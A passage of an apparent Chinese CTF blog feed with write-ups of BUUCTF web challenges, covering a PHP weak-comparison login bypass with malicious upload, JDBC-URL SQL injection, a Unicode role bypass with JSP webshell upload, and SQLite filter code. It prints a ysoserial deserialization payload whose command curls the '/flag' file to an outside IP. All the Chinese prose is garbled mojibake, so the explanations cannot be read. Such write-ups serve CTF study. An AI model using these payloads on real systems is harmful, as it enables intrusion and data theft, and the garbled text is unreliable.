src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTFè®°å½•3</title>
      <link href="/posts/560a0a51.html"/>
      <url>/posts/560a0a51.html</url>
      
        <content type="html"><![CDATA[<p>BUUç¬¬ä¸‰ä»½</p><span id="more"></span><h2 id="æå®¢å¤§æŒ‘æˆ˜-2020-Roamphp2-Myblog"><a href="#æå®¢å¤§æŒ‘æˆ˜-2020-Roamphp2-Myblog" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2020]Roamphp2-Myblog"></a>[æå®¢å¤§æŒ‘æˆ˜ 2020]Roamphp2-Myblog</h2><p>æ˜æ˜¾çš„æ–‡ä»¶è¯»å–ï¼Œloginä¸­èƒ½çœ‹åˆ°ç™»å½•å¯†ç ç”Ÿæˆé€»è¾‘ï¼Œå®Œå…¨éšæœºï¼Œæ²¡æ³•ç›´æ¥æ‹¿åˆ°</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$secret_seed</span> <span class="token operator">=</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">mt_srand</span><span class="token punctuation">(</span><span class="token variable">$secret_seed</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>çœ‹ç™»å½•é€»è¾‘</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$logined</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string double-quoted-string">"Longlone"</span> <span class="token keyword">and</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token comment">// No one knows my password, including myself</span>        <span class="token variable">$logined</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'status'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$logined</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$logined</span> <span class="token operator">===</span> <span class="token constant boolean">false</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'status'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'status'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;script>alert('username or password not correct!');window.location.href='index.php?page=login';&lt;/script>"</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span>  <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'Files'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'status'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$tmp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'Files'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$tmp_path</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'Files'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$extension</span> <span class="token operator">=</span> <span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$tmp_file</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'extension'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token variable">$allows</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'gif'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'jpeg'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'jpg'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'png'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$extension</span><span class="token punctuation">,</span><span class="token variable">$allows</span><span class="token punctuation">,</span><span class="token constant boolean">true</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'Files'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token function">array_map</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token variable">$ext</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token string single-quoted-string">'image/'</span><span class="token operator">.</span><span class="token variable">$ext</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token variable">$allows</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$upload_name</span> <span class="token operator">=</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">uniqid</span><span class="token punctuation">(</span><span class="token function">microtime</span><span class="token punctuation">(</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'.'</span><span class="token operator">.</span><span class="token variable">$extension</span><span class="token punctuation">;</span>        <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$tmp_path</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"assets/img/upload/"</span><span class="token operator">.</span><span class="token variable">$upload_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;script>alert('Update image -> assets/img/upload/$&#123;upload_name&#125;') &lt;/script>"</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;script>alert('Update illegal! Only allows like \'gif\', \'jpeg\', \'jpg\', \'png\' ') &lt;/script>"</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¯ä»¥çœ‹åˆ°å¯†ç éªŒè¯ä¸­æœ‰ä¸€ä¸ªå¼±æ¯”è¾ƒï¼Œä¼ å…¥passwordä¸ºç©ºç›´æ¥ç»•è¿‡ï¼Œç„¶åå°±æ˜¯æ–‡ä»¶ä¸Šä¼ ï¼Œé€»è¾‘å°±æ˜¯åªèƒ½ä¼ å›¾ç‰‡ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰é™åˆ¶æ–‡ä»¶å†…å®¹ï¼Œé‚£pharæˆ–è€…zipå§å†…å®¹æ‰“åŒ…éƒ½å¯ä»¥ï¼ˆå› ä¸ºè§¦å‘è¿˜éœ€è¦indexä¸­çš„include xxx.phpï¼Œæ‰€ä»¥æ–‡ä»¶åªèƒ½ä»¥phpç»“å°¾ï¼‰ï¼Œè®°å¾—æ‹¦æˆªåŒ…ä¿®æ”¹ä¸€ä¸‹usernameå’Œpasswordå‚æ•°ï¼Œä¸ç„¶ç›´æ¥é€€å‡ºäº†</p><pre class="line-numbers language-none"><code class="language-none">flag&#123;fa7bcb65-99a0-4643-93c2-93cacaaf442c&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="ç½‘é¼æ¯-2020-æœ±é›€ç»„-Think-Java"><a href="#ç½‘é¼æ¯-2020-æœ±é›€ç»„-Think-Java" class="headerlink" title="[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]Think Java"></a>[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]Think Java</h2><p>å˜¿å˜¿åšçš„ç¬¬ä¸€é“Javaé¢˜ï¼Œè®°å½•ä¸€ä¸‹Javaåº”è¯¥æ€ä¹ˆå…¥æ‰‹ï¼Œé¦–å…ˆç›®å½•æ‰«æï¼Œæ‰«å‡ºäº†<code>swagger-ui.html</code>ï¼Œå¯ä»¥çœ‹åˆ°è¿™ä¸ªwebé¡µé¢ä½¿ç”¨çš„æ‰€æœ‰API<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209081837086.png"></p><p>çœ‹ä»£ç æ˜¯<code>/common/test/sqlDict</code>è¿™ä¸€è·¯å¾„çš„è°ƒç”¨ï¼Œå…¶ä¸­dbNameæ˜¯æˆ‘ä»¬ä¼ å‚å†…å®¹ï¼Œè·Ÿè¿›å…¶ä¸­çš„SqlDict.getTableDataï¼ŒæŸ¥çœ‹getConnectionæ–¹æ³•ï¼Œå…¶ä¸­æœ¬è´¨æ˜¯é€šè¿‡jdbcæ¥å£è¿›è¡Œæ•°æ®åº“è¿æ¥ï¼Œè€Œjdbcåœ¨è§£ææ•°æ®åº“æ—¶ç±»ä¼¼äºå¯¹URLçš„è§£æ</p><blockquote><p>JDBC çš„ URL ä¹Ÿç±»ä¼¼ http è¯·æ±‚ä¸­çš„ URLï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨é”šç‚¹ # æˆ–è€… ? å¦‚ï¼šjdbc:mysql://mysqldbserver:3306/myapp#â€™ union select 2#</p></blockquote><p>ä¹Ÿå°±æ˜¯#åé¢çš„å†…å®¹ä¼šè¢«å¿½ç•¥ï¼Œä½†æ˜¯è¿™éƒ¨åˆ†ä¿¡æ¯ä¾ç„¶ä¼šè¢«ä¼ é€’åˆ°dbNameå‚æ•°ä¸­è¿›è¡Œæ¥ä¸‹æ¥çš„æŸ¥è¯¢</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209081837304.png"></p><p>é‚£æˆ‘ä»¬å°±å¯ä»¥ç›´æ¥æ„é€ å‡ºsqlæ³¨å…¥çš„è¯­å¥</p><pre class="line-numbers language-none"><code class="language-none">dbName&#x3D;myapp#&#39; union select group_concat(name,0x3a,pwd)from user#æ„é€ å‡ºçš„è¯­å¥Select TABLE_COMMENT from INFORMATION_SCHEMA.TABLES Where table_schema &#x3D; &#39;myapp#&#39; union select group_concat(name,0x3a,pwd)from user#åé¢çš„ä¸é‡è¦<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>æ‹¿åˆ°ç”¨æˆ·åå’Œå¯†ç <code>admin:admin@Rrrr_ctf_asde</code></p><p>ç™»å½•æˆåŠŸæ‹¿åˆ°tokenï¼Œå‘ç°æ˜¯Javaåºåˆ—åŒ–åå†…å®¹</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209081917768.png"></p><p>å¹¶ä¸”å°†å†…å®¹æäº¤åˆ°currentAPIä¸­æ—¶ï¼Œä¹Ÿä¼šè¿”å›ç”¨æˆ·ä¿¡æ¯ï¼Œysoæ„é€ åºåˆ—åŒ–æ”»å‡»å³å¯</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">&#x2F;Users&#x2F;jlan&#x2F;Library&#x2F;Java&#x2F;JavaVirtualMachines&#x2F;azul-1.8.0_332&#x2F;Contents&#x2F;Home&#x2F;bin&#x2F;java -jar &#x2F;Users&#x2F;jlan&#x2F;Documents&#x2F;Tools&#x2F;ysoserial-all.jar ROME &quot;curl http:&#x2F;&#x2F;182.61.46.138:1000 -d @&#x2F;flag&quot; |base64<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209081932780.png"></p><h2 id="GKCTF-2021-babycat"><a href="#GKCTF-2021-babycat" class="headerlink" title="[GKCTF 2021]babycat"></a>[GKCTF 2021]babycat</h2><p>å¿«ä¹javaé¢˜ï¼Œé¶æœºå¯åŠ¨çœŸçš„å¥½æ…¢ï¼Œä¸Šæ¥å°±æ˜¯ä¸€ä¸ªntç™»å½•ç•Œé¢ï¼Œç™»å½•ä¸è¡Œï¼Œæ³¨å†Œæœªå¼€æ”¾<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209131744693.png"></p><p>ä½†æ˜¯ç‚¹å‡»æ³¨å†ŒæŸ¥çœ‹æºä»£ç å‘ç°æ˜¯æ³¨å†Œé€»è¾‘è¢«æ³¨é‡Šï¼ŒæŒ‰ç…§æ³¨é‡Šçš„é€»è¾‘æ„é€ payloadæ³¨å†Œï¼ŒæˆåŠŸæ³¨å†Œå¹¶ç™»å½•<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209131745556.png"></p><p>è¿›å…¥ä¸»é¡µå‘ç”µæ–‡ä»¶ä¸Šä¼ éœ€è¦adminæƒé™ï¼Œå¹¶ä¸”åœ¨downloadå­˜åœ¨æ–‡ä»¶æ³„éœ²ï¼Œå…ˆçœ‹web.xmlå†…å®¹ï¼Œæ ¹æ®å†…å®¹å°†classæ–‡ä»¶ä¾æ¬¡ä¸‹è½½ï¼Œä¸‹é¢æˆ‘ä»¬ä¸»è¦æŸ¥çœ‹uploadServletå’ŒregisterServlet</p><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;!DOCTYPE web-app PUBLIC &quot;-&#x2F;&#x2F;Sun Microsystems, Inc.&#x2F;&#x2F;DTD Web Application 2.3&#x2F;&#x2F;EN&quot; &quot;http:&#x2F;&#x2F;java.sun.com&#x2F;dtd&#x2F;web-app_2_3.dtd&quot; &gt;&lt;web-app&gt;  &lt;servlet&gt;    &lt;servlet-name&gt;register&lt;&#x2F;servlet-name&gt;    &lt;servlet-class&gt;com.web.servlet.registerServlet&lt;&#x2F;servlet-class&gt;  &lt;&#x2F;servlet&gt;  &lt;servlet&gt;    &lt;servlet-name&gt;login&lt;&#x2F;servlet-name&gt;    &lt;servlet-class&gt;com.web.servlet.loginServlet&lt;&#x2F;servlet-class&gt;  &lt;&#x2F;servlet&gt;  &lt;servlet&gt;    &lt;servlet-name&gt;home&lt;&#x2F;servlet-name&gt;    &lt;servlet-class&gt;com.web.servlet.homeServlet&lt;&#x2F;servlet-class&gt;  &lt;&#x2F;servlet&gt;  &lt;servlet&gt;    &lt;servlet-name&gt;upload&lt;&#x2F;servlet-name&gt;    &lt;servlet-class&gt;com.web.servlet.uploadServlet&lt;&#x2F;servlet-class&gt;  &lt;&#x2F;servlet&gt;  &lt;servlet&gt;    &lt;servlet-name&gt;download&lt;&#x2F;servlet-name&gt;    &lt;servlet-class&gt;com.web.servlet.downloadServlet&lt;&#x2F;servlet-class&gt;  &lt;&#x2F;servlet&gt;  &lt;servlet&gt;    &lt;servlet-name&gt;logout&lt;&#x2F;servlet-name&gt;    &lt;servlet-class&gt;com.web.servlet.logoutServlet&lt;&#x2F;servlet-class&gt;  &lt;&#x2F;servlet&gt;  &lt;servlet-mapping&gt;    &lt;servlet-name&gt;logout&lt;&#x2F;servlet-name&gt;    &lt;url-pattern&gt;&#x2F;logout&lt;&#x2F;url-pattern&gt;  &lt;&#x2F;servlet-mapping&gt;  &lt;servlet-mapping&gt;    &lt;servlet-name&gt;download&lt;&#x2F;servlet-name&gt;    &lt;url-pattern&gt;&#x2F;home&#x2F;download&lt;&#x2F;url-pattern&gt;  &lt;&#x2F;servlet-mapping&gt;  &lt;servlet-mapping&gt;    &lt;servlet-name&gt;register&lt;&#x2F;servlet-name&gt;    &lt;url-pattern&gt;&#x2F;register&lt;&#x2F;url-pattern&gt;  &lt;&#x2F;servlet-mapping&gt;  &lt;display-name&gt;java&lt;&#x2F;display-name&gt;  &lt;servlet-mapping&gt;    &lt;servlet-name&gt;login&lt;&#x2F;servlet-name&gt;    &lt;url-pattern&gt;&#x2F;login&lt;&#x2F;url-pattern&gt;  &lt;&#x2F;servlet-mapping&gt;  &lt;servlet-mapping&gt;    &lt;servlet-name&gt;home&lt;&#x2F;servlet-name&gt;    &lt;url-pattern&gt;&#x2F;home&lt;&#x2F;url-pattern&gt;  &lt;&#x2F;servlet-mapping&gt;  &lt;servlet-mapping&gt;    &lt;servlet-name&gt;upload&lt;&#x2F;servlet-name&gt;    &lt;url-pattern&gt;&#x2F;home&#x2F;upload&lt;&#x2F;url-pattern&gt;  &lt;&#x2F;servlet-mapping&gt;  &lt;filter&gt;    &lt;filter-name&gt;loginFilter&lt;&#x2F;filter-name&gt;    &lt;filter-class&gt;com.web.filter.LoginFilter&lt;&#x2F;filter-class&gt;  &lt;&#x2F;filter&gt;  &lt;filter-mapping&gt;    &lt;filter-name&gt;loginFilter&lt;&#x2F;filter-name&gt;    &lt;url-pattern&gt;&#x2F;home&#x2F;*&lt;&#x2F;url-pattern&gt;  &lt;&#x2F;filter-mapping&gt;  &lt;display-name&gt;java&lt;&#x2F;display-name&gt;  &lt;welcome-file-list&gt;    &lt;welcome-file&gt;&#x2F;WEB-INF&#x2F;index.jsp&lt;&#x2F;welcome-file&gt;  &lt;&#x2F;welcome-file-list&gt;&lt;&#x2F;web-app&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é‚£æˆ‘ä»¬è¯¥å¦‚ä½•æˆä¸ºadminå‘¢ï¼Œç›´æ¥çœ‹æ³¨å†Œç±»ä¸­çš„å…³é”®ä»£ç </p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token class-name">StringUtils</span><span class="token punctuation">.</span><span class="token function">isNullOrEmpty</span><span class="token punctuation">(</span>role<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> <span class="token operator">=</span> <span class="token keyword">var</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span>role<span class="token punctuation">,</span> <span class="token string">"\"role\":\"guest\""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    person <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Person</span><span class="token punctuation">)</span>gson<span class="token punctuation">.</span><span class="token function">fromJson</span><span class="token punctuation">(</span><span class="token keyword">var</span><span class="token punctuation">,</span> <span class="token class-name">Person</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    person <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Person</span><span class="token punctuation">)</span>gson<span class="token punctuation">.</span><span class="token function">fromJson</span><span class="token punctuation">(</span><span class="token keyword">var</span><span class="token punctuation">,</span> <span class="token class-name">Person</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    person<span class="token punctuation">.</span><span class="token function">setRole</span><span class="token punctuation">(</span><span class="token string">"guest"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ­¤å¤„å¯¹æˆ‘ä»¬ä¼ å…¥çš„dataæ³¨å†Œä¿¡æ¯è¿›è¡Œäº†å¤„ç†ï¼Œå°†roleçš„jsonå†…å®¹æ¢æˆäº†guestï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬ç›´æ¥æ›´æ”¹dataä¸­çš„roleå±æ€§æ˜¯è¡Œä¸é€šçš„ï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨unicodeå­—ç¬¦ç»•è¿‡ï¼Œå¹¶ä¸”åœ¨å±æ€§ä¸­å¤šæ·»åŠ ä¸€å±‚å†…å®¹ä½¿å…¶ä¸­åŒ…å«äº†roleå±æ€§æ¥ç¡®ä¿æˆ‘ä»¬èƒ½å¤Ÿè¿›å…¥ç¬¬ä¸€ä¸ªåˆ¤æ–­ï¼Œæ„é€ å‡ºçš„payloadå¦‚ä¸‹</p><pre class="line-numbers language-none"><code class="language-none"><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ³¨å†ŒæˆåŠŸå¹¶ä¸”æˆåŠŸè¿›å…¥æ–‡ä»¶ä¸Šä¼ ç•Œé¢<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209131804530.png"> </p><p>ä¼ ä¸€ä¸ªjspé©¬åˆ°staticç›®å½•ä¸‹è¿æ¥å³å¯</p><p>ä½†æ˜¯ä¼¼ä¹buuçš„è¿™ä¸ªç‰ˆæœ¬æ˜¯ä¿®å¤åçš„ï¼Œå¯¹æ–‡ä»¶å†…å®¹è¿›è¡Œäº†è¿‡æ»¤ï¼Œæ²¡æ³•ä¼ ğŸï¼Œæˆ‘æœ‰ä»€ä¹ˆåŠæ³•ï¼ˆ</p><h2 id="HarekazeCTF2019-Sqlite-Voting"><a href="#HarekazeCTF2019-Sqlite-Voting" class="headerlink" title="[HarekazeCTF2019]Sqlite Voting"></a>[HarekazeCTF2019]Sqlite Voting</h2><p>æºç å…¨æ˜¯è¿‡æ»¤</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'source'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token variable">$banword</span> <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token comment">// dangerous chars</span>    <span class="token comment">// " % ' * + / &lt; = > \ _ ` ~ -</span>    <span class="token string double-quoted-string">"[\"%'*+\\/&lt;=>\\\\_`~-]"</span><span class="token punctuation">,</span>    <span class="token comment">// whitespace chars</span>    <span class="token string single-quoted-string">'\s'</span><span class="token punctuation">,</span>    <span class="token comment">// dangerous functions</span>    <span class="token string single-quoted-string">'blob'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'load_extension'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'char'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'unicode'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'(in|sub)str'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'[lr]trim'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'like'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'glob'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'match'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'regexp'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'in'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'limit'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'order'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'union'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'join'</span>  <span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token variable">$regexp</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'|'</span><span class="token punctuation">,</span> <span class="token variable">$banword</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/i'</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$regexp</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-Type: text/json; charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// check user input</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'error'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'You must specify vote id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token 